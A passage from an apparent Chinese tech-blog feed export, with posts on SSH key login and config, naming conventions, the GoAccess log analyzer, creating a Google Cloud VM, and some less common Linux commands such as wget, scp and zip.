address&gt;</span><br></pre></td></tr></table></figure><p>不出意外，就可以不用输入密码而直接成功登录了。</p><p>如果你仍然需要输入密码或者遇到其他问题了，可以从以下方向进行排查。</p><h3 id="常见问题："><a href="#常见问题：" class="headerlink" title="常见问题："></a>常见问题：</h3><ol><li>如果没有使用默认的密钥名称（id_rsa），则在连接主机时需要加上<code>-i</code> 参数，指定对应密钥的名称。否则由于默认私钥与远程主机中的自定义公钥不匹配，自然无法基于密钥进行认证，会再次提示你输入密码。</li><li>服务端的<code>$HOME/.ssh</code>目录的正常权限是700，服务端<code>$HOME/.ssh/authorized_keys</code>文件的权限默认为600。</li><li>上传密钥时使用的是：公钥（.pub），进行密钥认证时使用的是：私钥。</li></ol><h3 id="配置ssh-config"><a href="#配置ssh-config" class="headerlink" title="配置ssh config"></a>配置ssh config</h3><p>上面的命令虽然可以实现免密登录，但是命令太长了，就算是复制粘贴也有可能会出错。</p><p>那有没有什么好的办法，解决这个问题呢？</p><p>当然是有的啦。</p><p>在<code>$HOME/.ssh</code> 目录下，创建一个名为<code>config</code>的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim $HOME&#x2F;.ssh&#x2F;conifg</span><br></pre></td></tr></table></figure><p>加入以下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host alias</span><br><span class="line">    User user</span><br><span class="line">    HostName ip address</span><br><span class="line">    Port port</span><br><span class="line">    IdentityFile ~&#x2F;.ssh&#x2F;your_key</span><br><span class="line">    ServerAliveInterval 360</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>Host：可以理解成别名，配置完成之后，最后就通过 <code>ssh alias</code> 进行登录。</li><li>User：远程主机的用户名称</li><li>HostName：远程主机的地址</li><li>Port：端口号</li><li>IdentityFile：私钥文件的路径</li><li>ServerAliveInterval：保持客户端与服务端会话在短时间内不会断开。</li></ul><p>当然，如果你是使用<code>ssh 客户端</code>，那就不用配置这些。</p><h3 id="禁用通过密码认证"><a href="#禁用通过密码认证" class="headerlink" title="禁用通过密码认证"></a>禁用通过密码认证</h3><p>如果上面的配置都无误，可以正常通过密钥进行免密登录，那么最后需要做的一件事情就是关闭服务端的通过密码进行身份认证。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line"># 将yes 改为 no</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure><p>然后重启 sshd 服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><p>以上就是有关如何用自定义的密钥对进行免密认证的全部过程了。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> SSH </tag>
            
            <tag> SSHD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命名规范——程序员的自我修养</title>
      <link href="/naming-convention-programmer-s-self-cultivation/"/>
      <url>/naming-convention-programmer-s-self-cultivation/</url>
      
        <content type="html"><![CDATA[<p>之所以会有这样一篇笔记呢，是因为在各种不同的场景下，面临命名这件事情，有时候会犯迷糊，不知道该如何选择正确的方式命名。所以这篇笔记的目的就是为解决这个问题。</p><a id="more"></a><h2 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h2><p>命名规范包含了：目录、文件、变量、函数命名。<br>值得一提的是：<strong>命名规则没有谁对谁错，在项目中保持一致才是关键。</strong></p><p>混乱或错误的命名不仅让我们对代码难以理解，更糟糕的是，会误导我们的思维，导致对代码的理解完全错误。<br>相反，良好的命名，则可以让我们的代码非常容易读懂，也能向读者正确表达事物以及逻辑的本质，从而使得代码的可维护性就大大增强，读命名好的文章是非常流畅的，会有一种享受的感觉。</p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>因为Windows，OSX 下文件夹不区分大小写，Linux 是区分的。所以在文件夹的命名上面，建议全部用小写。可以包含下划线(<code>_</code>)或连字符(<code>-</code>)。如果没有约定，(<code>_</code>)更好。</p><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><p>文件的命名也是推荐和目录的连字符保持一致。Linux 文件系统推荐的文件命名是下划线(<code>_</code>)。</p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>类型名称通常使用大写驼峰命名法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class MyClass</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h4 id="类成员"><a href="#类成员" class="headerlink" title="类成员"></a>类成员</h4><p>不管是静态还是非静态，类数据成员的命名都可以和普通变量一样，采用驼峰命名法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123;</span><br><span class="line">    public $myVariable;</span><br><span class="line">    public static $myStaticVariable;</span><br><span class="line">    </span><br><span class="line">    public function myFunction($firstWord, $secondWord)&#123;</span><br><span class="line">        &#x2F;&#x2F;方法中的参数名推荐使用小驼峰命名法</span><br><span class="line">        ...</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>一般名称的前缀都是有第一规律的，如is（判断）、get（得到），set（设置）。</p></blockquote><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量的命名有两种方式：</p><ul><li>下划线命名法：my_variable</li><li>小驼峰命名法：myVariable</li></ul><p>但通常还是推荐使用，下划线命名法（全是小写）。</p><blockquote><p>不同的语言也是有不同的规范，例如JavaScript 变量推荐驼峰命名法，CSS 推荐连字符(-)。</p></blockquote><h3 id="常量、全局常量"><a href="#常量、全局常量" class="headerlink" title="常量、全局常量"></a>常量、全局常量</h3><p>常量和全局常量通常使用全大写和下划线的方式来命名，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const MY_CONSTANT;</span><br><span class="line">define(&quot;DEFAULT_NUM&quot;, 10);</span><br></pre></td></tr></table></figure><h3 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;引用变量</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;静态变量</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;全局变量</span><br></pre></td></tr></table></figure><h3 id="函数命名"><a href="#函数命名" class="headerlink" title="函数命名"></a>函数命名</h3><p>函数的命名使用下划线命名法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function my_function()&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h4><p>函数和方法的区别：<br>函数是一段可以重用的代码块，方法是在类里面的函数。</p><p>参考链接：</p><ul><li><a href="https://www.cnblogs.com/rainman/p/3756521.html" target="_blank" rel="noopener">PHP 命名规范</a></li><li><a href="https://www.zhihu.com/question/21440067" target="_blank" rel="noopener">如何优雅的为变量和函数命名</a></li><li><a href="https://zh-google-styleguide.readthedocs.io/en/latest/" target="_blank" rel="noopener">命名约定 | Google开源项目风格指南</a></li><li><a href="https://leohxj.gitbooks.io/a-programmer-prepares/programmer-basic/naming.html" target="_blank" rel="noopener">命名规范 | 程序员的自我修养</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 碎碎念 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志分析工具 - GoAccess</title>
      <link href="/log-analysis-tool-goaccess/"/>
      <url>/log-analysis-tool-goaccess/</url>
      
        <content type="html"><![CDATA[<p>日志的重要性不言而喻，可我似乎完全忽略了它，导致往往出现什么问题，第一时间并不是去看日志。</p><a id="more"></a><p>很显然我完全忽视了它的强大性，就拿 nginx 的访问日志来说，可以从中分析出如下信息：</p><ol><li>请求的响应时间</li><li>请求达到的后端服务器的地址和端口</li><li>请求是否存在缓存配置</li><li>请求体、请求头、响应体和响应头的大小等</li><li>客户端的IP 地址、UserAgent 等信息</li><li>自定义变量的内容</li></ol><p>通过这些信息，可以得到响应耗时的请求以及请求量和并发量，从而分析并发原因，这对于应用级别的服务来说是非常重要的。</p><h2 id="GoAccess-是什么"><a href="#GoAccess-是什么" class="headerlink" title="GoAccess 是什么"></a>GoAccess 是什么</h2><p>GoAccess 是一个开源的<strong>实时网络日志分析器</strong>和<strong>交互式查看器</strong>，可以在类 Unix 系统中的终端或通过浏览器运行。 —— GoAccess 官方</p><blockquote><p>为什么选择 GoAccess？</p></blockquote><ol><li><p>因为GoAccess 被设计成一个基于终端的快速日志分析器。它的核心思想是实时快速分析和查看Web服务器统计信息，而无需使用浏览器。同时也可以将输入到HTML 或者 CSV、JSON。</p></li><li><p>GoAccess几乎可以解析任何Web日志格式（Apache，Nginx，Amazon S3，Elastic Load Balancing，CloudFront等）。只需要设置日志格式并根据您的日志运行它。</p></li></ol><h2 id="GoAccess-入门"><a href="#GoAccess-入门" class="headerlink" title="GoAccess 入门"></a>GoAccess 入门</h2><p>昨天在使用 GoAccess 时，踩到了一些坑，导致我一度认为这个工具是不是存在什么Bug。因为在看别人的教程中都是开箱即用。</p><p>下面从安装到使用会一一详细说明。</p><h3 id="安装-GoAccess"><a href="#安装-GoAccess" class="headerlink" title="安装 GoAccess"></a>安装 GoAccess</h3><p>因为服务器的操作系统是 <code>Ubuntu</code>，所以这里以 <code>Ubuntu</code>为例：</p><p> 因为并非所有发行版都提供最新版本的 GoAccess，所以这里使用官方提供的最新稳定版的安装方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;deb http:&#x2F;&#x2F;deb.goaccess.io&#x2F; $（lsb_release -cs）main&quot; | sudo tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;goaccess.list</span><br><span class="line">$ wget -O - https:&#x2F;&#x2F;deb.goaccess.io&#x2F;gnugpg.key | sudo apt-key add - </span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install goaccess</span><br></pre></td></tr></table></figure><h3 id="确定日志格式"><a href="#确定日志格式" class="headerlink" title="确定日志格式"></a>确定日志格式</h3><p>在计算机安装了GoAccess 之后，要做的第一件事情就是确定访问日志的日志格式，可以在永久设置它们，也可以通过命令行传递他们。</p><p>这里用Nginx 的 access.log 为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">36.113.128.155 - - [28&#x2F;Apr&#x2F;2019:02:20:01 +0000] &quot;GET &#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html HTTP&#x2F;1.1&quot; 200 7798 &quot;http:&#x2F;&#x2F;www.692213.com&#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.110 Safari&#x2F;537.36&quot;</span><br></pre></td></tr></table></figure><p>方式一，配置<code>.goaccessrc</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~&#x2F;.goaccessrc</span><br><span class="line"></span><br><span class="line">time-format %T</span><br><span class="line">date-format %d&#x2F;%b&#x2F;%Y</span><br><span class="line">log_format %h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^</span><br></pre></td></tr></table></figure><p>方式二，在命令行传递参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess nginx&#x2F;access.log --log-format&#x3D;&#39;%h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^&#39; --date-format&#x3D;%d&#x2F;%b&#x2F;%Y --time-format&#x3D;%T</span><br></pre></td></tr></table></figure><blockquote><p>注意：无论是配置文件还是命令行参数 都不是永远不变的，只是相对于你要监控的日志格式。</p></blockquote><h3 id="运行GoAccess"><a href="#运行GoAccess" class="headerlink" title="运行GoAccess"></a>运行GoAccess</h3><p>方式一，通过<code>-p</code>参数，指定配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess nginx&#x2F;access.log  -p ~&#x2F;.goaccessrc</span><br></pre></td></tr></table></figure><p>方式二，直接在命令行参数中指定日志格式，详情见上面的例子。</p><h4 id="终端输出"><a href="#终端输出" class="headerlink" title="终端输出"></a>终端输出</h4><p>以下提示使用预定义日志格式的日志配置对话框供您选择，然后实时显示统计信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess nginx&#x2F;access.log -c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827144401.png" alt=""></p><p>通常选择第三个，通用日志格式（CLF），成功之后就是这样个样子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827151540.png" alt=""></p><p>控制台下的操作方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">* F1或h主要帮助。</span><br><span class="line">* F5重绘主窗口。</span><br><span class="line">* q退出程序，当前窗口或折叠活动模块</span><br><span class="line">* o或ENTER展开所选模块或打开窗口</span><br><span class="line">* 0-9并将Shift + 0所选模块设置为活动状态</span><br><span class="line">* j在展开的模块中向下滚动</span><br><span class="line">* k在扩展模块中向上滚动</span><br><span class="line">* c设置或更改方案颜色</span><br><span class="line">* ^ f在活动模块中向前滚动一个屏幕</span><br><span class="line">* ^ b在活动模块中向后滚动一个屏幕</span><br><span class="line">* TAB迭代模块（转发）</span><br><span class="line">* SHIFT + TAB迭代模块（向后）</span><br><span class="line">* s对活动模块的排序选项</span><br><span class="line">* &#x2F;搜索所有模块（允许正则表达式）</span><br><span class="line">* n找到下一个出现的位置</span><br><span class="line">* g移至屏幕的第一个项目或顶部</span><br><span class="line">* G移动到屏幕的最后一项或底部</span><br></pre></td></tr></table></figure><h4 id="静态HTML-输出"><a href="#静态HTML-输出" class="headerlink" title="静态HTML 输出"></a>静态HTML 输出</h4><p>以下内容分析访问日志并在静态HTML报告中显示统计信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html</span><br></pre></td></tr></table></figure><h4 id="实时HTML-输出"><a href="#实时HTML-输出" class="headerlink" title="实时HTML 输出"></a>实时HTML 输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html --real-time-html</span><br></pre></td></tr></table></figure><p>然后用浏览器访问，大概就是这个样子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827151617.png" alt=""></p><h4 id="配置文件及日志格式说明"><a href="#配置文件及日志格式说明" class="headerlink" title="配置文件及日志格式说明"></a>配置文件及日志格式说明</h4><p>GoAccess 的配置文件位于<code>%sysconfdir%/goaccess.conf</code>或<code>~/.goaccessrc</code></p><blockquote><p>其中，%sysconfdir%是 /etc/，/usr/etc/ 或 /usr/local/etc/</p></blockquote><p><code>time-format</code>和<code>date-format</code>的格式通常都是固定的，只有<code>log-format</code>的格式视具体日志格式而定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">time-format %T</span><br><span class="line"></span><br><span class="line">date-format %d&#x2F;%b&#x2F;%Y</span><br></pre></td></tr></table></figure><p><code>log-format</code>常用格式说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">* %x与时间格式和日期格式变量匹配的日期和时间字段。当给出时间戳而不是日期和时间在两个单独的变量中时使用。</span><br><span class="line">* %t时间字段匹配时间格式变量。</span><br><span class="line">* %d与日期格式变量匹配的日期字段。</span><br><span class="line">* %v服务器名称根据规范名称设置（服务器块或虚拟主机）。</span><br><span class="line">* %e这是HTTP身份验证确定的请求文档的人的用户标识。</span><br><span class="line">* %hhost（客户端IP地址，IPv4或IPv6）</span><br><span class="line">* %r来自客户端的请求行。这需要围绕请求的特定分隔符（单引号，双引号等）可解析。否则，使用特殊的格式说明符，如组合%m，%U，%q和%H解析各个字段。</span><br><span class="line">注意：使用或者%r获得完整的请求OR %m，%U，%q并%H形成你的要求，不要同时使用。</span><br><span class="line">* %m请求方法。</span><br><span class="line">* %U请求的URL路径。</span><br><span class="line">注意：如果查询字符串在%U，则无需使用%q。但是，如果URL路径不包含任何查询字符串，则可以使用%q并将查询字符串附加到请求中。</span><br><span class="line">* %q查询字符串。</span><br><span class="line">* %H请求协议。</span><br><span class="line">* %s服务器发送回客户端的状态代码。</span><br><span class="line">* %b返回给客户端的对象大小。</span><br><span class="line">* %R“Referer”HTTP请求标头。</span><br><span class="line">* %u用户代理HTTP请求标头。</span><br><span class="line">* %D服务请求所需的时间，以微秒为单位。</span><br><span class="line">* %T服务请求所需的时间，以毫秒为单位，分辨率为毫秒。</span><br><span class="line">* %L 服务请求所用的时间，以毫秒为单位的十进制数。</span><br><span class="line">* %^忽略此字段。</span><br><span class="line">* %~向前移动日志字符串，直到找到非空格（！isspace）char。</span><br><span class="line">* ~h X-Forwarded-For（XFF）字段中的主机（客户端IP地址，IPv4或IPv6）。</span><br></pre></td></tr></table></figure><h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><ul><li><code>-f</code>：指定需要分析的日志文件路径</li><li><code>-c</code>：程序启动时提示日志/日期配置窗口</li><li><code>-p</code>：指定要使用的自定义配置文件</li><li><code>-d</code>：在HTML或JSON输出上启用IP解析器</li><li><code>-o</code>：输出到指定扩展名文件中（Html、Json、CSV）</li><li><code>-a</code>：按主机启用用户代理列表。为了更快地解析，请不要启用此标志</li><li><code>-d</code>：在HTML或JSON输出上启用IP解析器。</li></ul><p>总结：GoAccess 从安装到使用还是非常方便的，不仅可以对历史的日志进行分析，也能实时对日志进行分析，所支持的日志格式基本能满足大多数应用场景。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://goaccess.io/" target="_blank" rel="noopener">GoAccess 官网</a></li><li><a href="https://goaccess.io/get-started" target="_blank" rel="noopener">GoAccess 入门</a></li><li><a href="https://www.jianshu.com/p/c6310332f411" target="_blank" rel="noopener">使用GoAccess 分析Nginx 日志</a></li><li><a href="https://github.com/stockrt/nginx2goaccess" target="_blank" rel="noopener">将Nginx log_format转换为goaccess配置文件</a></li><li><a href="https://serverfault.com/questions/779405/goaccess-date-time-log-format-error" target="_blank" rel="noopener">GoAccess 日志格式转换案例一</a></li><li><a href="https://github.com/allinurl/goaccess/issues/1244" target="_blank" rel="noopener">GoAccess 日志格式转换案例二</a></li><li><a href="https://github.com/allinurl/goaccess/issues/668" target="_blank" rel="noopener">GoAccess 日志格式转换案例三</a></li><li><a href="https://github.com/allinurl/goaccess/issues/1338" target="_blank" rel="noopener">GoAccess 日志格式转换案例四</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
            <tag> GoAccess </tag>
            
            <tag> Logs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手把手教你如何创建启动 Google Cloud 实例</title>
      <link href="/teach-you-how-to-create-and-start-a-google-cloud-instance/"/>
      <url>/teach-you-how-to-create-and-start-a-google-cloud-instance/</url>
      
        <content type="html"><![CDATA[<p>最近需要在Google Cloud 上重新开一台Hk区的服务器，所以写这篇笔记用来记录操作过程。</p><a id="more"></a><h2 id="创建VM-实例"><a href="#创建VM-实例" class="headerlink" title="创建VM 实例"></a>创建VM 实例</h2><ul><li><a href="https://cloud.google.com/" target="_blank" rel="noopener">Google Cloud 官网</a></li><li><a href="https://console.cloud.google.com/" target="_blank" rel="noopener">Google Cloud Platform 控制台</a></li></ul><p>进入控制台，找到 Compute Engine，点击创建实例。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142145.png" alt=""></p><p>新建虚拟机实例，选择相应的配置。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142211.png" alt=""></p><p>选择操作系统映像，以及磁盘大小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142232.png" alt=""></p><p>基本配置如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142253.png" alt=""></p><p>然后点击创建就可以了。创建成功之后，就可以看到该服务器的IP地址了。</p><p>这里需要注意的是，Google Cloud 的远程连接SSH 的方式与其他平台有所区别。</p><h2 id="创建SSH-连接"><a href="#创建SSH-连接" class="headerlink" title="创建SSH 连接"></a>创建SSH 连接</h2><p>Compute Engine =》元数据 =》SSH 密钥</p><p>找到修改，然后上传你的 SSH Key。</p><p>不知道SSH Key 是什么？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa</span><br><span class="line"># 打开终端，输入上面那个命令</span><br><span class="line"># 然后在~&#x2F;.ssh 目录下会生成一个 公钥和私钥</span><br><span class="line"># 将 .pub 结尾的文件打开，复制其中的值，粘贴到Google Cloud 上就可以了。</span><br></pre></td></tr></table></figure><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>使用<code>ssh -i max@35.241.77.3</code> 命令连接，其中 max 是用户名，后面是对应服务器 ip地址。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200827142317.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://cloud.google.com/compute/docs/quickstart-linux" target="_blank" rel="noopener">开启Linux 虚拟机使用快速入门–官网文档</a></li><li><a href="https://zhuanlan.zhihu.com/p/40983101" target="_blank" rel="noopener">GCP（Google Cloud Platform）入门</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Linux </tag>
            
            <tag> 云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不常用Linux命令</title>
      <link href="/not-commonly-used-linux-commands/"/>
      <url>/not-commonly-used-linux-commands/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记的目的是记录那些不太常用但却很实用的 Linux 命令。</p><a id="more"></a><h2 id="Wget"><a href="#Wget" class="headerlink" title="Wget"></a>Wget</h2><p>wget 命令用于文件的下载，</p><h5 id="下载单个文件"><a href="#下载单个文件" class="headerlink" title="下载单个文件"></a>下载单个文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 下载Ubuntu 18.04 桌面版和服务端版</span><br><span class="line">$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-live-server-amd64.iso</span><br><span class="line">$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-desktop-amd64.iso</span><br></pre></td></tr></table></figure><p>wget默认会以最后一个符合”/”的后面的字符来命令，对于动态链接的下载通常文件名会不正确。</p><p>为了解决这个问题，我们可以使用参数-O来指定一个文件名：</p><h5 id="下载单个文件并重命名"><a href="#下载单个文件并重命名" class="headerlink" title="下载单个文件并重命名"></a>下载单个文件并重命名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -O file.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080</span><br></pre></td></tr></table></figure><h5 id="后台下载"><a href="#后台下载" class="headerlink" title="后台下载"></a>后台下载</h5><p>当需要下载比较大的文件时，使用参数<code>-b</code>可以隐藏在后台进行下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -b http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure><p>可以使用以下命令来察看下载进度：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tail -f wget-log</span><br></pre></td></tr></table></figure><h2 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h2><h2 id="Scp"><a href="#Scp" class="headerlink" title="Scp"></a>Scp</h2><p>scp 命令用于文件传输，在不能使用 XShell 这类工具时，scp能很好的解决文件上传的问题。</p><h5 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ scp -r &#x2F;c&#x2F;User&#x2F;Desktop&#x2F;dirname username@34.92.117.222:&#x2F;tmp&#x2F;dirname</span><br></pre></td></tr></table></figure><h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$scp -r  Boo@34.92.117.222:&#x2F;tmp&#x2F;dirname &#x2F;c&#x2F;Users&#x2F;Boo&#x2F;Desktop&#x2F;dirname</span><br></pre></td></tr></table></figure><p>如果存在端口号：</p><p>注意：<code>-P</code>参数是大写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 58812 root@103.232.86.239:&#x2F;tmp&#x2F;runfast_0603.sql ~&#x2F;File&#x2F;</span><br></pre></td></tr></table></figure><p>其中 <code>-r</code> 参数表示目录，<code>username</code> 表示服务器对应用户，<code>@</code> 后面接服务器地址。</p><p>注意：不要直接使用 root 用户，因为总是会提示你权限不足。另外使用非 root 用户时，需要注意文件夹权限的问题。</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>zip 命令用于对文件进行打包处理，也就是我们常说的压缩。文件经压缩之后会生成一个具有<code>.zip</code>扩展名的压缩文件。</p><p>将当前目录的<code>dir</code>目录下的所有文件及文件夹压缩为 example.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r -q example.zip dir</span><br></pre></td></tr></table></figure><p>将当前目录下的所有文件及文件夹压缩为 example.zip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r 